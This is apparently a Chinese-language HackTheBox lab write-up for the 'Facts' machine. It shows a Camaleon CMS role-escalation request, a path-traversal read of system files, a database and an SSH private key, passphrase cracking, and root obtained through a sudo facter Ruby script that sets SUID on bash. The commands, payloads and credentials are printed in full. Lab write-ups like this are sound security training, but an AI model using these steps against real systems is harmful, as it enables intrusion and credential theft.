---
title: HTB-facts WriteUp
published: 2026-03-02
description: HackTheBox facts 通关记录。
image: http://imgur.41an.com/piclist/2026-03/htb-facts-95161a20484a549f0a9f1ab04e9e66d3.png
tags:
  - Penetration
  - cap/priv
  - os/linux
category: 打靶日记
draft: false
lang: zh_CN
---
## 1. Recon
nmap 扫描端口
```shell
└─# nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p- 10.129.9.22
...
Discovered open port 22/tcp on 10.129.9.22
Discovered open port 80/tcp on 10.129.9.22
Discovered open port 54321/tcp on 10.129.9.22
...
```
访问 `http://10.129.9.22`，跳转域名
```shell
└─# curl -I http://10.129.9.22
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.26.3 (Ubuntu)
Date: Mon, 02 Mar 2026 16:41:34 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://facts.htb/
```
加入域名解析
```shell
echo "10.129.9.22 facts.htb" >> /etc/hosts
```
目录扫描发现 `/admin` 会 302跳转至 `/admin/login`
> `dirsearch` 和 `feroxbuster` 默认不显示302 记录
```shell
└─# gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/small.txt 
...
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
/captcha              (Status: 200) [Size: 5773]
/en                   (Status: 200) [Size: 11109]
/error                (Status: 500) [Size: 7918]
/index                (Status: 200) [Size: 11116]
/page                 (Status: 200) [Size: 19593]
/post                 (Status: 200) [Size: 11308]
/rss                  (Status: 200) [Size: 183]
/search               (Status: 200) [Size: 19187]
/sitemap              (Status: 200) [Size: 3508]
/svn                  (Status: 200) [Size: 11113]
/up                   (Status: 200) [Size: 73]
/welcome              (Status: 200) [Size: 11966]
```
## 2. Foothold
注册登录后发现这是一个基于 `Camaleon CMS 2.9.0` 的系统
![image.png](http://imgur.41an.com/piclist/2026-03/htb-facts-cms-876a01aac0b2a85b19763513d79f7fc3.png)
搜索发现其在更改口令处有一个越权漏洞，可将普通用户提权至管理员用户
```http
POST /admin/users/5/updated_ajax HTTP/1.1
Host: facts.htb
...

...&password[role]=admin...
```

![image.png](http://imgur.41an.com/piclist/2026-03/htb-facts-cms-vuln-0ac661a13e12f70f4077e0444159be78.png)
已知 `Camaleon CMS` 还存在一个LFI 漏洞 [CVE-2024-46987](https://nvd.nist.gov/vuln/detail/CVE-2024-46987)  ，因此可获取到该系统账户信息
```http
curl http://target/admin/media/download_private_file?file=../../../../../../etc/passwd

...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```
通过此，我们再获取 `Camaleon CMS` 配置文件
```shell
curl http://facts.htb/admin/media/download_private_file?file=../config/database.yml
```
回显如下，可见生产环境数据库配置文件为`storage/production.sqlite3`
```http
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

# Store production database in the storage/ directory, which by default
# is mounted as a persistent Docker volume in config/deploy.yml.
production:
  primary:
    <<: *default
    database: storage/production.sqlite3
  cache:
    <<: *default
    database: storage/production_cache.sqlite3
    migrations_paths: db/cache_migrate
  queue:
    <<: *default
    database: storage/production_queue.sqlite3
    migrations_paths: db/queue_migrate
  cable:
    <<: *default
    database: storage/production_cable.sqlite3
    migrations_paths: db/cable_migrate
```
继续读取
```shell
curl http://facts.htb/admin/media/download_private_file?file=../storage/production.sqlite3
```
发现该数据库中存在一段密文
```shell
└─# sqlite3 production.sqlite3     
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
action_mailbox_inbound_emails     cama_media                      
action_text_rich_texts            cama_metas                      
active_storage_attachments        cama_posts                      
active_storage_blobs              cama_term_relationships         
active_storage_variant_records    cama_term_taxonomy              
ar_internal_metadata              cama_users                      
cama_comments                     plugins_attacks                 
cama_custom_fields                plugins_contact_forms           
cama_custom_fields_relationships  schema_migrations               
sqlite> select * from cama_users;
1|admin|admin|admin@local.com||$2a$12$9lLBXaBzcTxohKjxX08aR.WmE7qyhwpl0NGGBLbKDi6t.PB5zdJcK|1QGOA6YxgFANPE6XlGYPpg||||2026-01-08 15:30:12.955853|2025-09-07 21:57:52.634896|2026-01-08 15:30:12.961004|-1|||1|Administrator|
sqlite> 
```
`bcrypt` 爆破无终放弃
```shell
hashcat -a 0 -m 3200 hash.txt /path/to/rockyou.txt
```
继续读取用户 `ssh_key`
```shell
curl http://facts.htb/admin/media/download_private_file?file=../../../../../../../home/trivia/.ssh/id_ed25519 HTTP/1.1

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABC6AkfilF
4X1qH1Sc5xJYfeAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAICBGEBfDnLSrxPmq
Cin19lfTaTRgIuGU4tkvz5tCeQp+AAAAoItEd36VziyWstwTUztFPsQJO06LIWZ8Pt/FzY
smSg6ChZmRzSKKcgJnOb1LG1b+JUQdSz69eTt0yaajIRptM3+h8vwjC9vhBBLqUTmuVlUb
ZYfyhRWZGzxwFFoqT+++kYnHOqBJNjU0WouBYSAteRwopg9pnGOuk4iTKyz+Q5W5nD6UM2
6c5c5aE455JP79OidG6tzK7WFdL8l0L0HAF7I=
-----END OPENSSH PRIVATE KEY-----
```
尝试直接登录，发现该私钥需要口令
```shell
ssh trivia@facts.htb -i trivia_id_ed25519 
The authenticity of host 'facts.htb (10.129.9.22)' can't be established.
ED25519 key fingerprint is SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'facts.htb' (ED25519) to the list of known hosts.
Enter passphrase for key 'trivia_id_ed25519': 
```
> btw，`Filesystem Settings` 还有 `aws` 秘钥，通过此也可以获取到用户的秘钥

![image.png](http://imgur.41an.com/piclist/2026-03/htb-facts-s3key-818daaec203a7937c4cc832b9801b833.png)
配置 `aws` 工具
```shell
└─# aws configure
AWS Access Key ID [None]: your_access_key
AWS Secret Access Key [None]: your_secret_key
Default region name [None]: us-east-1
Default output format [None]: table
```
列举桶
```shell
└─# aws s3 ls s3:// \
	--region us-east-1 \
	--endpoint-url http://facts.htb:54321
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```
查看目录
```shell
└─# aws s3 ls s3://internal/.ssh/ \
	--region us-east-1 \
	--endpoint-url http://facts.htb:54321
2026-03-04 03:19:01         82 authorized_keys
2026-03-04 03:19:01        464 id_ed25519
```
下载
```shell
└─# aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 \
  --region us-east-1 \
  --endpoint-url http://facts.htb:54321
```
提取公钥，查看注释发现也是 `trivia` 用户的秘钥
```shell
ssh-keygen -y -f id_ed25519
Enter passphrase for "id_ed25519": 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDf5CZ1RpU3PZLHP71c/3+dAtPYTMF4HoBP51ffD8AW5 trivia@facts.htb
```
提取 `ssh` 的加密秘钥hash
```shell
ssh2john trivia_id_ed25519 
```
使用 john 爆破
```shell
john ssh_hash.txt --wordlist=rockyou.txt

...
dragonballz      (trivia_id_ed25519)     
...
```
## 3. PrivEsc
`sudo -l` 发现有个可以 `sudo` 的脚本
```shell
sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
由 [gtfobins/facter](https://gtfobins.org/gtfobins/facter/) 得知 `facter` 将会执行 `--custom-dir` 目录下的第一个 `.rb文件`
因此在 `tmp` 目录下创建一个 `rb` 提权脚本
```ruby
#!/usr/bin/env ruby
require 'fileutils'

file = '/bin/bash'

mode = File.stat(file).mode
File.chmod(mode | 0o4000, file)
```
或者直接更简洁的
```ruby
#!/usr/bin/env ruby

system("chmod +s /bin/bash")
```
执行
```shell
trivia@facts:~$ sudo /usr/bin/facter --custom-dir=/tmp/ x
trivia@facts:~$ /bin/bash -p
bash-5.2# whoami
root
```
---
## 4. Reference

[Mass Assignment Vulnerability in Camaleon CMS 2.9.0 (AJAX Privilege Escalation)](https://medium.com/@iamkumarraj/mass-assignment-vulnerability-in-camaleon-cms-2-9-0-ajax-privilege-escalation-9a09c8253b52)
[ssh mode 22921 ($6$) token length exception](https://hashcat.net/forum/thread-10662.html)
